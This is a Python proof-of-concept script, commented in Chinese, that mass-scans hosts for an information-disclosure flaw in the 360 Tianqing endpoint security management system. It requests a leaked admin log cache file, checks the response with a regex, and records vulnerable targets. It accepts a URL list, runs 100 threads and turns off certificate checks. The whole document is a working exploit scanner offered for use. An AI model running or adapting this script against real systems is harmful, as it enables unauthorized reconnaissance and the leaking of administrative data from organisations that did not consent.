import sys,requests, argparse,re # 导入模块
from multiprocessing.dummy import Pool # 导入线程池处理多线程
requests.packages.urllib3.disable_warnings() # 关闭警告
def banner ():
    test = """360新天擎终端安全管理系统信息泄露漏洞"""
    print(test) # 打印""360新天擎""""
def main():
    banner() # 调用横幅函数
    parser = argparse.ArgumentParser(description="360新天擎终端安全管理系统信息泄露漏洞") # 创建解析器处理命令行参数
    parser.add_argument("-u", "--url", dest="url", type=str, help="Please enter url") # 添加运行url参数
    parser.add_argument("-f", "--file", dest="file", type=str, help="Please enter file") # 添加运行文件参数
    args = parser.parse_args() # 解析命令行参数
    if args.url and not args.file: # 如果指定url,没有指定文件
        poc(args.url)  # 调用poc函数检测指定的url
    elif args.file and not args.url:  # 如果指定文件,没有指定url
        url_list = [] # 创建一个url列表存储读取的url
        with open(args.file, 'r', encoding='utf-8') as f: # 读取文件中的url
            for url in f.readlines():
                url_list.append(url.strip().replace('\n','')) # 替换换行符为空,并添加到列表
        mp = Pool(100)  # 创建一个线程池为100
        mp.map(poc, url_list)  # 将任务分发到线程池中
        mp.close() # 关闭线程池,不再接受新任务
        mp.join() # 等待所有线程完成
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h") # 若提供的参数不符合要求,输出用法
def poc(target): # 定义poc函数
    payload = '/runtime/admin_log_conf.cache'
    headers = {
        'User-Agent':'Mozilla/5.0(WindowsNT 10.0;Win64;x64;rv:128.0) Gecko/20100101 Firefox/128.0)'
    }
    try: # 测试输入的url是否在以下漏洞的条件
        res1 = requests.get(url=target+payload,timeout=6, headers=headers, verify=False) # 发送get请求到目标rul,关闭证书
        content = re.findall(r's:12:"(.*?)";',res1.text, re.S)
        if '/login/login' in content:  # 如果'/login/login' 在content里
            print(f"[+]{target}存在信息泄露漏洞")  # 输出存在漏洞
            with open('360天擎_result.txt','a',encoding='utf-8') as f:  # 打开用于存储结果的文件,并追加写入结果
                f.write(f"{target}存在信息泄露漏洞'\n'")
        else:
            print(f"[-]{target}不存在信息泄露漏洞") # 若不存在输出目标url不存在漏洞
    except Exception as e:
        print(f"{target}可能存在信息泄露请手工测试") # 捕获异常，提示可能的问题
if __name__ == '__main__':
    main()

